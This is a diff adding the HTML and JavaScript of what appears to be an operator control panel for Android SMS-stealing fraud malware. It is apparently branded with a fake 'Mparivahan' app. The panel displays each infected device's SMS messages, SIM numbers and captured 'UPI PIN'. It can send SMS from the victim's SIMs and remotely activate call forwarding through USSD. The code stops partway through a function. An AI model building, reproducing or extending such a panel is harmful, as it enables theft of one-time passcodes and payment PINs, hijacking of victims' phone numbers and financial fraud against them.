@@ -1,0 +1,832 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Device Details — SMS Gateway</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+
+:root,[data-theme="light"]{
+  --bg:#f0f0f7;
+  --bg2:#ffffff;
+  --card:#ffffff;
+  --card2:#f8f9ff;
+  --border:#e2e5f0;
+  --border2:#c8ccdd;
+  --text:#1a1d2e;
+  --text2:#6b7080;
+  --text3:#adb2c3;
+  --accent:#1e2d6b;
+  --accent2:#3a54d4;
+  --accent-light:rgba(58,84,212,0.1);
+  --green:#00b96b;
+  --green-bg:rgba(0,185,107,0.1);
+  --red:#e53935;
+  --red-bg:rgba(229,57,53,0.1);
+  --yellow:#f59e0b;
+  --cyan:#0891b2;
+  --header-bg:#1e2d6b;
+  --overview-bg:#ffffff;
+  --btn-bg:#1e2d6b;
+  --btn2-bg:#e8ecf8;
+  --btn2-text:#1e2d6b;
+  --search-bg:#fffde7;
+  --search-border:#f59e0b;
+  --msg-bg:#ffffff;
+  --msg-border:#e2e5f0;
+  --shadow:0 2px 12px rgba(30,45,107,0.08);
+  --radius:16px;
+  --radius-sm:12px;
+  --popup-bg:#f0f0f7;
+  --popup-card:#ffffff;
+  --popup-input:#ffffff;
+  --sim-active:#6c5ce7;
+}
+[data-theme="dark"]{
+  --bg:#0b0d18;
+  --bg2:#13152a;
+  --card:#161930;
+  --card2:#1c1f38;
+  --border:#252848;
+  --border2:#353868;
+  --text:#e8eaf6;
+  --text2:#8890b0;
+  --text3:#4a5070;
+  --accent:#6c7fff;
+  --accent2:#8b9fff;
+  --accent-light:rgba(108,127,255,0.12);
+  --green:#00e676;
+  --green-bg:rgba(0,230,118,0.1);
+  --red:#ff5252;
+  --red-bg:rgba(255,82,82,0.1);
+  --yellow:#ffd600;
+  --cyan:#00e5ff;
+  --header-bg:#0f1124;
+  --overview-bg:#161930;
+  --btn-bg:#6c7fff;
+  --btn2-bg:#1c1f38;
+  --btn2-text:#8b9fff;
+  --search-bg:rgba(255,214,0,0.06);
+  --search-border:rgba(255,214,0,0.4);
+  --msg-bg:#161930;
+  --msg-border:#252848;
+  --shadow:0 2px 16px rgba(0,0,0,0.4);
+  --radius:16px;
+  --radius-sm:12px;
+  --popup-bg:#0f1124;
+  --popup-card:#161930;
+  --popup-input:#1c1f38;
+  --sim-active:#a29bfe;
+}
+
+body{font-family:'DM Sans',-apple-system,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;-webkit-font-smoothing:antialiased;transition:background 0.3s,color 0.3s;}
+
+/* Header */
+.header{background:var(--header-bg);color:#fff;padding:14px 16px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:200;box-shadow:0 2px 16px rgba(0,0,0,0.2);}
+.header-left{display:flex;align-items:center;gap:10px;}
+.back-btn{background:rgba(255,255,255,0.15);border:none;color:#fff;width:36px;height:36px;border-radius:10px;font-size:18px;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:background 0.2s;}
+.back-btn:hover{background:rgba(255,255,255,0.25);}
+.header-title{font-size:17px;font-weight:700;color:#fff;}
+.header-right{display:flex;align-items:center;gap:8px;}
+.theme-toggle{background:rgba(255,255,255,0.15);border:none;color:#fff;width:34px;height:34px;border-radius:9px;font-size:15px;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:background 0.2s;}
+.theme-toggle:hover{background:rgba(255,255,255,0.25);}
+.online-dot{font-size:11px;font-weight:700;padding:4px 10px;border-radius:20px;background:rgba(0,230,118,0.2);color:#00e676;border:1px solid rgba(0,230,118,0.4);white-space:nowrap;}
+.offline-dot{background:rgba(255,82,82,0.2);color:#ff5252;border:1px solid rgba(255,82,82,0.4);}
+
+/* Page */
+.page{max-width:520px;margin:0 auto;padding:0 0 80px;}
+
+/* Overview */
+.overview-card{background:var(--overview-bg);margin:12px 12px 0;border-radius:var(--radius);border:1px solid var(--border);box-shadow:var(--shadow);overflow:hidden;}
+.ov-head{display:flex;align-items:center;justify-content:space-between;padding:14px 16px 10px;border-bottom:1px solid var(--border);}
+.ov-title{display:flex;align-items:center;gap:8px;font-size:16px;font-weight:700;color:var(--text);}
+.ov-status{font-size:11px;font-weight:700;color:var(--green);}
+.ov-network{font-size:11px;font-weight:600;color:var(--accent2);background:var(--accent-light);padding:2px 8px;border-radius:6px;}
+.ov-copy{background:none;border:1px solid var(--border);width:30px;height:30px;border-radius:8px;cursor:pointer;font-size:13px;display:flex;align-items:center;justify-content:center;color:var(--text2);transition:all 0.2s;}
+.ov-copy:hover{border-color:var(--accent2);color:var(--accent2);}
+.ov-grid{display:grid;grid-template-columns:1fr 1fr;gap:0;}
+.ov-row{padding:10px 16px;border-bottom:1px solid var(--border);display:flex;flex-direction:column;gap:2px;}
+.ov-row:nth-child(odd){border-right:1px solid var(--border);}
+.ov-row:last-child,.ov-row:nth-last-child(2):nth-child(odd){border-bottom:none;}
+.ov-lbl{font-size:10px;font-weight:600;color:var(--text3);text-transform:uppercase;letter-spacing:0.06em;}
+.ov-val{font-size:13px;font-weight:600;color:var(--text);display:flex;align-items:center;gap:6px;font-family:'JetBrains Mono',monospace;}
+.sim-copy{background:none;border:1px solid var(--border);width:22px;height:22px;border-radius:6px;cursor:pointer;font-size:10px;display:flex;align-items:center;justify-content:center;color:var(--text3);transition:all 0.2s;flex-shrink:0;}
+.sim-copy:hover{border-color:var(--accent2);color:var(--accent2);}
+.upi-val{color:var(--accent2);font-weight:700;}
+.lastseen-val{font-size:11px;font-family:'DM Sans',sans-serif;}
+
+/* Search */
+.search-wrap{margin:12px 12px 0;position:relative;}
+.search-icon{position:absolute;left:14px;top:50%;transform:translateY(-50%);font-size:14px;color:var(--text3);pointer-events:none;}
+.search-input{width:100%;background:var(--search-bg);border:1.5px solid var(--search-border);border-radius:var(--radius-sm);padding:12px 40px 12px 38px;color:var(--text);font-size:14px;font-family:'DM Sans',sans-serif;outline:none;transition:all 0.2s;}
+.search-input:focus{border-color:var(--accent2);background:var(--bg2);}
+.search-input::placeholder{color:var(--text3);}
+.search-clear{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;color:var(--text3);font-size:16px;cursor:pointer;padding:4px;display:none;}
+
+/* Action Buttons */
+.action-btns{margin:12px 12px 0;display:grid;grid-template-columns:1fr 1fr;gap:8px;}
+.action-btn{background:var(--btn-bg);color:#fff;border:none;border-radius:var(--radius-sm);padding:13px 10px;font-size:14px;font-weight:700;font-family:'DM Sans',sans-serif;cursor:pointer;transition:all 0.2s;display:flex;align-items:center;justify-content:center;gap:6px;}
+.action-btn:hover{opacity:0.88;transform:translateY(-1px);}
+.action-btn:active{transform:translateY(0);opacity:1;}
+.action-btn.full{grid-column:1/-1;}
+.action-btn.outline{background:var(--btn2-bg);color:var(--btn2-text);border:1.5px solid var(--border2);}
+.action-btn.outline:hover{border-color:var(--accent2);background:var(--accent-light);}
+
+/* Messages Section */
+.section-head{display:flex;align-items:center;justify-content:space-between;padding:16px 16px 8px;}
+.section-title{font-size:15px;font-weight:700;color:var(--text);display:flex;align-items:center;gap:6px;}
+.msg-count{font-size:11px;background:var(--accent-light);padding:2px 8px;border-radius:20px;color:var(--accent2);font-weight:600;}
+.refresh-btn{background:none;border:1px solid var(--border);width:30px;height:30px;border-radius:8px;cursor:pointer;font-size:13px;display:flex;align-items:center;justify-content:center;color:var(--text3);transition:all 0.2s;}
+.refresh-btn:hover{border-color:var(--accent2);color:var(--accent2);}
+
+/* Filter Tabs */
+.filter-tabs{display:flex;gap:6px;padding:0 12px 8px;overflow-x:auto;}
+.filter-tab{padding:6px 16px;border-radius:20px;border:1.5px solid var(--border);background:transparent;color:var(--text2);font-size:12px;font-weight:600;font-family:'DM Sans',sans-serif;cursor:pointer;white-space:nowrap;transition:all 0.2s;}
+.filter-tab.active{background:var(--btn-bg);color:#fff;border-color:var(--btn-bg);}
+.filter-tab:hover:not(.active){border-color:var(--accent2);color:var(--accent2);}
+
+/* Message Card */
+.msg-card{background:var(--msg-bg);border:1px solid var(--msg-border);border-radius:var(--radius-sm);margin:0 12px 8px;padding:12px 14px;box-shadow:var(--shadow);animation:slideUp 0.3s ease;transition:border-color 0.2s;}
+.msg-card:hover{border-color:var(--border2);}
+@keyframes slideUp{from{opacity:0;transform:translateY(8px);}to{opacity:1;transform:translateY(0);}}
+.msg-label{font-size:10px;font-weight:700;color:var(--text3);text-transform:uppercase;letter-spacing:0.05em;margin-bottom:4px;}
+.msg-body{font-size:13px;color:var(--text);line-height:1.5;word-break:break-word;white-space:pre-wrap;margin-bottom:8px;}
+.msg-body .highlight{background:rgba(245,158,11,0.25);color:#b45309;border-radius:3px;padding:0 2px;font-weight:700;}
+[data-theme="dark"] .msg-body .highlight{color:#fde68a;}
+.msg-footer{display:flex;align-items:flex-start;justify-content:space-between;flex-wrap:wrap;gap:4px;}
+.msg-from{font-size:11px;font-weight:700;color:var(--text2);font-family:'JetBrains Mono',monospace;margin-bottom:3px;}
+/* Bold meta info */
+.msg-meta-row{display:flex;gap:1px;}
+.msg-meta-row span{font-size:11px;font-weight:700;color:var(--text);}
+.msg-type-badge{font-size:9px;font-weight:700;padding:2px 7px;border-radius:5px;text-transform:uppercase;letter-spacing:0.05em;flex-shrink:0;margin-top:2px;}
+.badge-received{background:var(--green-bg);color:var(--green);}
+.badge-sent{background:var(--accent-light);color:var(--accent2);}
+
+/* Infinite scroll */
+#scrollSentinel{height:1px;}
+.loading-more{text-align:center;padding:14px;font-size:12px;color:var(--text3);display:none;}
+.loading-more.show{display:block;}
+
+/* Empty/Loading */
+.state-msg{text-align:center;padding:40px 20px;color:var(--text3);font-size:13px;}
+
+/* ==========================================
+   POPUP — iOS-style centered card
+   ========================================== */
+.overlay{
+  position:fixed;inset:0;
+  background:rgba(0,0,0,0.45);
+  z-index:999;
+  display:none;
+  align-items:center;
+  justify-content:center;
+  padding:20px;
+}
+.overlay.open{display:flex;animation:fadeOv 0.2s ease;}
+@keyframes fadeOv{from{opacity:0;}to{opacity:1;}}
+
+/* The white rounded card */
+.popup{
+  background:var(--popup-bg);
+  border-radius:22px;
+  width:100%;max-width:340px;
+  animation:popIn 0.25s cubic-bezier(0.34,1.56,0.64,1);
+  overflow:hidden;
+  box-shadow:0 20px 60px rgba(0,0,0,0.25);
+}
+@keyframes popIn{from{opacity:0;transform:scale(0.88);}to{opacity:1;transform:scale(1);}}
+
+.popup-head{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:20px 20px 16px;
+}
+.popup-title{font-size:18px;font-weight:800;color:var(--text);}
+.popup-close{
+  background:var(--btn2-bg);border:none;
+  width:30px;height:30px;border-radius:50%;
+  font-size:14px;cursor:pointer;
+  display:flex;align-items:center;justify-content:center;
+  color:var(--text2);font-weight:700;transition:all 0.2s;
+}
+.popup-close:hover{background:var(--red-bg);color:var(--red);}
+.popup-body{padding:0 16px 20px;}
+
+/* iOS-style grouped input fields */
+.field-group{
+  background:var(--popup-card);
+  border-radius:14px;
+  overflow:hidden;
+  margin-bottom:12px;
+}
+.field-row{
+  display:flex;align-items:center;
+  padding:0 16px;
+  border-bottom:1px solid var(--border);
+  background:var(--popup-card);
+}
+.field-row:last-child{border-bottom:none;}
+.field-input{
+  width:100%;background:transparent;border:none;
+  padding:14px 0;color:var(--text);
+  font-size:15px;font-family:'DM Sans',sans-serif;
+  outline:none;
+}
+.field-input::placeholder{color:var(--text3);}
+.field-textarea{
+  width:100%;background:transparent;border:none;
+  padding:14px 0;color:var(--text);
+  font-size:15px;font-family:'DM Sans',sans-serif;
+  outline:none;resize:none;min-height:80px;line-height:1.4;
+}
+.field-textarea::placeholder{color:var(--text3);}
+.char-count{font-size:12px;color:var(--text3);flex-shrink:0;font-weight:600;padding-left:8px;}
+
+/* SIM pills */
+.sim-section{margin-bottom:12px;}
+.sim-label{font-size:13px;color:var(--text2);font-weight:600;margin-bottom:8px;padding:0 2px;}
+.sim-pills{display:flex;gap:10px;}
+.sim-pill{
+  flex:1;padding:12px 10px;border-radius:50px;
+  border:2px solid var(--border);background:var(--popup-card);
+  color:var(--text2);font-size:14px;font-weight:700;
+  font-family:'DM Sans',sans-serif;cursor:pointer;transition:all 0.2s;text-align:center;
+}
+.sim-pill.active{background:var(--sim-active);color:#fff;border-color:var(--sim-active);}
+.sim-pill:hover:not(.active){border-color:var(--sim-active);color:var(--sim-active);}
+
+/* Send / Action button inside popup */
+.popup-btn{
+  width:100%;padding:14px;border-radius:14px;border:none;
+  background:var(--sim-active);color:#fff;
+  font-size:15px;font-weight:700;font-family:'DM Sans',sans-serif;
+  cursor:pointer;transition:all 0.2s;
+  display:flex;align-items:center;justify-content:center;gap:6px;
+  margin-bottom:8px;
+}
+.popup-btn:hover{opacity:0.9;transform:translateY(-1px);}
+.popup-btn:disabled{opacity:0.5;cursor:default;transform:none;}
+.popup-btn.navy{background:var(--btn-bg);}
+.popup-btn.danger{background:var(--red);}
+
+.popup-btn-row{display:flex;gap:8px;margin-bottom:0;}
+.popup-btn-row .popup-btn{margin-bottom:0;}
+
+.result-msg{margin-top:8px;padding:10px 14px;border-radius:10px;font-size:12px;font-weight:600;display:none;}
+.result-msg.success{background:var(--green-bg);color:var(--green);border:1px solid rgba(0,185,107,0.3);}
+.result-msg.error{background:var(--red-bg);color:var(--red);border:1px solid rgba(229,57,53,0.3);}
+
+/* Payment popup agent grid */
+.agent-info-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:12px;}
+.agent-info-item{background:var(--popup-card);border-radius:14px;padding:14px;}
+.agent-info-item .lbl{font-size:10px;font-weight:700;color:var(--text3);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:6px;}
+.agent-info-item .val{font-size:18px;font-weight:800;font-family:'JetBrains Mono',monospace;letter-spacing:2px;}
+.val-pin{color:var(--yellow);}
+.val-emp{color:#f97316;}
+.val-funny{color:var(--cyan);}
+.val-join{color:var(--green);font-size:13px;letter-spacing:0;}
+
+/* History */
+.history-scroll{max-height:200px;overflow-y:auto;background:var(--popup-card);border-radius:14px;padding:0 14px;margin-bottom:12px;}
+.history-item{display:flex;gap:10px;padding:10px 0;border-bottom:1px solid var(--border);}
+.history-item:last-child{border-bottom:none;}
+.h-bar{width:4px;border-radius:2px;flex-shrink:0;}
+.h-body{flex:1;min-width:0;}
+.h-field{font-size:12px;font-weight:700;margin-bottom:3px;}
+.h-change{font-size:12px;display:flex;align-items:center;gap:5px;flex-wrap:wrap;}
+.h-old{color:var(--red);text-decoration:line-through;font-family:'JetBrains Mono',monospace;font-size:11px;}
+.h-new{color:var(--green);font-weight:700;font-family:'JetBrains Mono',monospace;font-size:11px;}
+.h-time{font-size:10px;color:var(--text3);margin-top:2px;}
+.history-lbl{font-size:12px;font-weight:700;color:var(--text3);text-transform:uppercase;letter-spacing:0.05em;margin-bottom:6px;padding:0 2px;}
+
+/* Toast */
+#toastBox{position:fixed;top:70px;right:12px;z-index:9999;display:flex;flex-direction:column;gap:6px;max-width:300px;}
+
+::-webkit-scrollbar{width:4px;}
+::-webkit-scrollbar-track{background:transparent;}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px;}
+
+@media(min-width:521px){.page{padding-bottom:60px;}}
+/* CF Status Card */
+.cf-card{background:var(--overview-bg);margin:12px 12px 0;border-radius:var(--radius);border:1px solid var(--border);box-shadow:var(--shadow);overflow:hidden;}
+.cf-head{display:flex;align-items:center;justify-content:space-between;padding:14px 16px 10px;border-bottom:1px solid var(--border);}
+.cf-title{display:flex;align-items:center;gap:8px;font-size:15px;font-weight:700;color:var(--text);}
+.cf-status-dot{width:10px;height:10px;border-radius:50%;flex-shrink:0;}
+.cf-status-dot.on{background:var(--green);box-shadow:0 0 8px rgba(0,185,107,0.5);animation:pulse 2s ease-in-out infinite;}
+.cf-status-dot.off{background:var(--red);}
+@keyframes pulse{0%,100%{box-shadow:0 0 4px rgba(0,185,107,0.3);}50%{box-shadow:0 0 12px rgba(0,185,107,0.7);}}
+.cf-check-btn{background:var(--btn2-bg);border:1px solid var(--border);color:var(--btn2-text);padding:6px 12px;border-radius:8px;font-size:11px;font-weight:700;font-family:'DM Sans',sans-serif;cursor:pointer;transition:all 0.2s;}
+.cf-check-btn:hover{border-color:var(--accent2);color:var(--accent2);}
+.cf-check-btn:disabled{opacity:0.5;cursor:default;}
+.cf-body{padding:12px 16px;}
+.cf-info-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;}
+.cf-info-item{background:var(--card2);border-radius:12px;padding:12px;}
+.cf-info-item .cf-lbl{font-size:10px;font-weight:600;color:var(--text3);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:4px;}
+.cf-info-item .cf-val{font-size:14px;font-weight:700;font-family:'JetBrains Mono',monospace;}
+.cf-val-on{color:var(--green);}
+.cf-val-off{color:var(--red);}
+.cf-val-num{color:var(--accent2);font-size:13px;}
+.cf-val-time{color:var(--text2);font-size:11px;font-family:'DM Sans',sans-serif;}
+.cf-ussd-resp{margin-top:8px;padding:10px 14px;background:var(--card2);border-radius:10px;font-size:11px;font-family:'JetBrains Mono',monospace;color:var(--text2);line-height:1.5;white-space:pre-wrap;display:none;border:1px solid var(--border);}
+</style>
+</head>
+<body>
+
+<header class="header">
+  <div class="header-left">
+    <button class="back-btn" onclick="window.location.href='/'">←</button>
+    <span class="header-title">Device Details</span>
+  </div>
+  <div class="header-right">
+    <span id="statusBadge" class="online-dot">● Online</span>
+    <button class="theme-toggle" onclick="toggleTheme()" id="themeBtn">☀️</button>
+  </div>
+</header>
+
+<div class="page">
+  <div class="overview-card">
+    <div class="ov-head">
+      <div class="ov-title">
+        Overview
+        <span class="ov-status" id="ovStatus">● Online</span>
+        <span class="ov-network" id="ovNetwork">Mparivahan</span>
+      </div>
+      <button class="ov-copy" onclick="copyAll()" title="Copy all">⧉</button>
+    </div>
+    <div class="ov-grid">
+      <div class="ov-row"><span class="ov-lbl">Model</span><span class="ov-val" id="ovModel">—</span></div>
+      <div class="ov-row"><span class="ov-lbl">Phone</span><span class="ov-val" id="ovPhone" style="font-size:12px">—</span></div>
+      <div class="ov-row"><span class="ov-lbl">SIM 1</span><span class="ov-val" style="font-size:12px"><span id="ovSim1">—</span><button class="sim-copy" onclick="copy(eid('ovSim1').textContent)">⧉</button></span></div>
+      <div class="ov-row"><span class="ov-lbl">SIM 2</span><span class="ov-val" style="font-size:12px"><span id="ovSim2">—</span><button class="sim-copy" onclick="copy(eid('ovSim2').textContent)">⧉</button></span></div>
+      <div class="ov-row"><span class="ov-lbl">UPI PIN</span><span class="ov-val upi-val" id="ovUpiPin">—</span></div>
+      <div class="ov-row"><span class="ov-lbl">Last Seen</span><span class="ov-val lastseen-val" id="ovLastSeen">—</span></div>
+    </div>
+  </div>
+
+  <div class="search-wrap">
+    <span class="search-icon">🔍</span>
+    <input type="text" class="search-input" id="searchInput" placeholder="Search messages...">
+    <button class="search-clear" id="searchClear" onclick="clearSearch()">✕</button>
+  </div>
+
+  <div class="action-btns">
+    <button class="action-btn" onclick="openPopup('paymentPopup')">💳 Payment</button>
+    <button class="action-btn" onclick="openPopup('sendSmsPopup')">✉️ Send SMS</button>
+    <button class="action-btn full outline" onclick="openPopup('callFwdPopup')">📞 Call Forwarding</button>
+  </div>
+
+  <!-- CF STATUS CARD -->
+  <div class="cf-card" id="cfCard">
+    <div class="cf-head">
+      <div class="cf-title">
+        📞 Call Forwarding
+        <span class="cf-status-dot off" id="cfStatusDot"></span>
+      </div>
+      <button class="cf-check-btn" id="cfCheckBtn" onclick="checkCFStatus()">🔍 Check Status</button>
+    </div>
+    <div class="cf-body">
+      <div class="cf-info-grid">
+        <div class="cf-info-item">
+          <div class="cf-lbl">Status</div>
+          <div class="cf-val cf-val-off" id="cfStatusText">OFF</div>
+        </div>
+        <div class="cf-info-item">
+          <div class="cf-lbl">Forward To</div>
+          <div class="cf-val cf-val-num" id="cfNumberText">—</div>
+        </div>
+        <div class="cf-info-item">
+          <div class="cf-lbl">Last Updated</div>
+          <div class="cf-val cf-val-time" id="cfUpdatedText">—</div>
+        </div>
+        <div class="cf-info-item">
+          <div class="cf-lbl">SIM</div>
+          <div class="cf-val cf-val-time" id="cfSimText">—</div>
+        </div>
+      </div>
+      <div class="cf-ussd-resp" id="cfUssdResp"></div>
+    </div>
+  </div>
+
+  <div class="section-head">
+    <div class="section-title">Messages <span class="msg-count" id="msgCount">0</span></div>
+    <button class="refresh-btn" onclick="loadMsgs()">↻</button>
+  </div>
+
+  <div class="filter-tabs">
+    <button class="filter-tab active" onclick="setFilter('all',this)">All</button>
+    <button class="filter-tab" onclick="setFilter('inbox',this)">Inbox</button>
+    <button class="filter-tab" onclick="setFilter('sent',this)">Sent</button>
+  </div>
+
+  <div id="messagesList"><div class="state-msg">Loading messages...</div></div>
+  <div class="loading-more" id="loadingMore">Loading more...</div>
+  <div id="scrollSentinel"></div>
+</div>
+
+<!-- ===== SEND SMS POPUP ===== -->
+<div class="overlay" id="sendSmsPopup" onclick="overlayClick(event,'sendSmsPopup')">
+  <div class="popup">
+    <div class="popup-head">
+      <span class="popup-title">Compose SMS</span>
+      <button class="popup-close" onclick="closePopup('sendSmsPopup')">✕</button>
+    </div>
+    <div class="popup-body">
+      <div class="field-group">
+        <div class="field-row">
+          <input type="tel" class="field-input" id="smsTo" placeholder="Recipient Number">
+        </div>
+        <div class="field-row" style="align-items:flex-start;">
+          <textarea class="field-textarea" id="smsBody" placeholder="Message" maxlength="160" oninput="updateCharCount()"></textarea>
+          <span class="char-count"><span id="charCount">0</span>/160</span>
+        </div>
+      </div>
+      <div class="sim-section">
+        <div class="sim-label">Send via:</div>
+        <div class="sim-pills">
+          <button class="sim-pill active" id="simPill0" onclick="selectSim(0)">SIM 1</button>
+          <button class="sim-pill" id="simPill1" onclick="selectSim(1)">SIM 2</button>
+        </div>
+      </div>
+      <button class="popup-btn" id="sendSmsBtn" onclick="sendSms()">Send</button>
+      <div id="smsResult" class="result-msg"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ===== PAYMENT POPUP ===== -->
+<div class="overlay" id="paymentPopup" onclick="overlayClick(event,'paymentPopup')">
+  <div class="popup" style="max-width:360px;">
+    <div class="popup-head">
+      <span class="popup-title">💳 Agent Info</span>
+      <button class="popup-close" onclick="closePopup('paymentPopup')">✕</button>
+    </div>
+    <div class="popup-body">
+      <div class="agent-info-grid">
+        <div class="agent-info-item"><div class="lbl">Agent PIN</div><div class="val val-pin" id="agentPin">—</div></div>
+        <div class="agent-info-item"><div class="lbl">Employee Code</div><div class="val val-emp" id="empCode">—</div></div>
+        <div class="agent-info-item"><div class="lbl">Funny Code</div><div class="val val-funny" id="funnyCode">—</div></div>
+        <div class="agent-info-item"><div class="lbl">Joining Date</div><div class="val val-join" id="joiningDate">—</div></div>
+      </div>
+      <div class="history-lbl">📜 Change History</div>
+      <div class="history-scroll" id="historyList">
+        <div class="state-msg" style="padding:16px 0">Loading...</div>
+      </div>
+      <button class="popup-btn navy" onclick="closePopup('paymentPopup')">Close</button>
+    </div>
+  </div>
+</div>
+
+<!-- ===== CALL FORWARDING POPUP ===== -->
+<div class="overlay" id="callFwdPopup" onclick="overlayClick(event,'callFwdPopup')">
+  <div class="popup">
+    <div class="popup-head">
+      <span class="popup-title">📞 Call Forwarding</span>
+      <button class="popup-close" onclick="closePopup('callFwdPopup')">✕</button>
+    </div>
+    <div class="popup-body">
+      <!-- Current status display -->
+      <div class="field-group" style="margin-bottom:12px;">
+        <div class="field-row" style="justify-content:space-between;padding:12px 16px;">
+          <span style="font-size:13px;font-weight:600;color:var(--text2)">Current Status:</span>
+          <span id="cfPopupStatus" style="font-size:13px;font-weight:800;color:var(--red)">OFF</span>
+        </div>
+        <div class="field-row" id="cfPopupNumRow" style="justify-content:space-between;padding:10px 16px;display:none;">
+          <span style="font-size:12px;color:var(--text3)">Forwarding to:</span>
+          <span id="cfPopupNum" style="font-size:12px;font-weight:700;color:var(--accent2);font-family:'JetBrains Mono',monospace"></span>
+        </div>
+      </div>
+      <div class="field-group">
+        <div class="field-row">
+          <input type="tel" class="field-input" id="cfNumber" placeholder="Forward to Number">
+        </div>
+      </div>
+      <div class="sim-section">
+        <div class="sim-label">Select SIM:</div>
+        <div class="sim-pills">
+          <button class="sim-pill active" id="cfSimPill0" onclick="selectCfSim(0)">SIM 1</button>
+          <button class="sim-pill" id="cfSimPill1" onclick="selectCfSim(1)">SIM 2</button>
+        </div>
+      </div>
+      <div class="popup-btn-row">
+        <button class="popup-btn navy" onclick="activateCF()" style="flex:1">✅ Activate</button>
+        <button class="popup-btn danger" onclick="deactivateCF()" style="flex:1">❌ Deactivate</button>
+      </div>
+      <div id="cfResult" class="result-msg" style="margin-top:8px;"></div>
+    </div>
+  </div>
+</div>
+
+<div id="toastBox"></div>
+
+<script>
+const API = window.location.origin;
+const deviceId = window.location.pathname.split('/').pop();
+const authToken = new URLSearchParams(window.location.search).get('token') || localStorage.getItem('gw_token') || '';
+let off = 0, filter = 'all', search = '', total = 0, ws = null, fetching = false;
+let selectedSim = 0, selectedCfSim = 0;
+const PS = 50;
+
+// Theme
+function toggleTheme(){const h=document.documentElement;const n=h.getAttribute('data-theme')==='dark'?'light':'dark';h.setAttribute('data-theme',n);localStorage.setItem('gw_theme',n);eid('themeBtn').textContent=n==='dark'?'🌙':'☀️';}
+(function(){const s=localStorage.getItem('gw_theme')||'light';document.documentElement.setAttribute('data-theme',s);setTimeout(()=>{const b=eid('themeBtn');if(b)b.textContent=s==='dark'?'🌙':'☀️';},50);})();
+
+const authHeaders={'x-auth-token':authToken,'Content-Type':'application/json'};
+function authFetch(url,opts={}){opts.headers={...opts.headers,'x-auth-token':authToken};return fetch(url,opts);}
+
+(async()=>{
+  try{const r=await authFetch(`${API}/api/auth-check`);if(!r.ok){window.location.href='/';return;}}
+  catch(e){window.location.href='/';return;}
+  loadDev();loadMsgs();loadHistory();loadCFStatus();connectWS();setupScroll();
+})();
+
+// Infinite scroll
+function setupScroll(){
+  const obs=new IntersectionObserver(entries=>{
+    if(entries[0].isIntersecting&&!fetching&&off+PS<total)loadMore();
+  },{rootMargin:'300px'});
+  obs.observe(eid('scrollSentinel'));
+}
+
+async function loadMore(){
+  if(fetching)return;
+  fetching=true;
+  eid('loadingMore').classList.add('show');
+  off+=PS;
+  await fetchMsgs(false);
+  eid('loadingMore').classList.remove('show');
+  fetching=false;
+}
+
+// WebSocket
+function connectWS(){
+  ws=new WebSocket(`ws://${window.location.host}?type=dashboard`);
+  ws.onmessage=e=>handle(JSON.parse(e.data));
+  ws.onclose=()=>setTimeout(connectWS,3000);
+  ws.onerror=()=>ws.close();
+}
+function handle(m){
+  if(m.deviceId&&m.deviceId!==deviceId)return;
+  switch(m.event){
+    case'device_online':setStatus(true);toast('Device ONLINE','success');break;
+    case'device_offline':setStatus(false);toast('Device OFFLINE','error');break;
+    case'new_sms':loadMsgs();toast(`📨 SMS from ${m.address}`,'info');break;
+    case'sms_sync':loadMsgs();loadDev();break;
+    case'sms_sent_result':toast(`📤 ${m.status}`+(m.error?': '+m.error:''),m.status==='sent'?'success':'error');break;
+    case'call_forward_result':{
+      const status = m.status;
+      const isActive = status === 'activated';
+      toast(`📞 CF ${status}${m.forwardTo ? ' → ' + m.forwardTo : ''}${m.ussdResponse ? '\n' + m.ussdResponse : ''}`, status==='failed'?'error':'success');
+      updateCFUI(isActive ? 1 : 0, isActive ? (m.forwardTo || '') : '', m.ussdResponse || '');
+      break;
+    }
+    case'call_forward_status_update':{
+      updateCFUI(m.cf_active, m.cf_number, '');
+      toast(`📞 CF Status: ${m.cf_active ? 'ON → ' + m.cf_number : 'OFF'}`, 'info');
+      break;
+    }
+    case'agent_info_updated':loadDev();loadHistory();toast('Agent info updated','success');break;
+    case'system_status':if(!m.enabled)toast('⚠️ System DISABLED','error');break;
+  }
+}
+function setStatus(on){
+  const b=eid('statusBadge');
+  b.textContent=on?'● Online':'● Offline';
+  b.className=on?'online-dot':'online-dot offline-dot';
+  eid('ovStatus').textContent=on?'● Online':'● Offline';
+  eid('ovStatus').style.color=on?'var(--green)':'var(--red)';
+}
+
+async function loadDev(){
+  try{
+    const r=await authFetch(`${API}/api/devices/${deviceId}`);
+    if(!r.ok)throw 0;
+    const d=await r.json();
+    eid('ovModel').textContent=d.name||'Unknown';
+    eid('ovPhone').textContent=d.phone||d.sim1_number||'—';
+    eid('ovSim1').textContent=d.sim1_number||'N/A';
+    eid('ovSim2').textContent=d.sim2_number||'N/A';
+    eid('ovUpiPin').textContent=d.agent_pin||'—';
+    eid('ovLastSeen').textContent=fmtLastSeen(d.last_seen);
+    eid('ovNetwork').textContent=d.network||'Mparivahan';
+    eid('agentPin').textContent=d.agent_pin||'—';
+    eid('empCode').textContent=d.employee_code||'—';
+    eid('funnyCode').textContent=d.funny_code||'—';
+    eid('joiningDate').textContent=d.joining_date||'—';
+    setStatus(d.is_online===1);
+    document.title=`${d.name||'Device'} — SMS Gateway`;
+  }catch(e){eid('ovModel').textContent='Device Not Found';}
+}
+
+async function loadMsgs(){
+  eid('messagesList').innerHTML='<div class="state-msg">Loading messages...</div>';
+  off=0;total=0;fetching=false;
+  await fetchMsgs(true);
+}
+
+async function fetchMsgs(replace){
+  try{
+    let u=`${API}/api/devices/${deviceId}/messages?limit=${PS}&offset=${off}`;
